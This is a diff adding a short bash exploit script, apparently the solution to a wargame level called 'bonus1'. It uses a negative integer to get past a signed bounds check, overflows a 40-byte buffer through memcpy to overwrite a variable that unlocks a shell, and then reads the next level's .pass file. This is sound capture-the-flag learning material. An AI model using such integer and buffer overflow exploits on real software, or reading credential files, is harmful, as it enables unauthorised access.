@@ -1,0 +1,26 @@
+# Helper function, "put n s" print the string 's' n times
+put() { printf "$2%.0s" $(seq 1 "$1"); }
+
+# Helper function, "hex 41424344" gives "ABCD"
+hex() { echo "$1" | xxd -p -r; }
+
+# Helper function, "hex_little_endian 41424344" gives "DBCA"
+hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
+
+# Overriding the value of n to 0x574f4c46 gives a reverse shell
+# We can do so by doing a buffer overflow
+# The program checks that (n <= 9) using a signed comparaison
+# We can enter a negative number, then do a memcpy with an overflowed (4 * n)
+# We want to write 44 chars to the 40 bytes buffer to override n
+# We thus enter "-1073741813", as "(int) -1073741813 * (int) 4 == 44"
+
+N_VALUE="574f4c46"
+N="$(hex_little_endian "${N_VALUE}")"
+N_INPUT="-1073741813"
+BUFFER_INPUT="$(put 11 "${N}")"
+
+# We print our exploit to the input and wait for the reverse shell to open with cat
+./bonus1 "${N_INPUT}" "${BUFFER_INPUT}"
+
+# We use the reverse shell to retrieve the password
+$ cat /home/user/bonus2/.pass
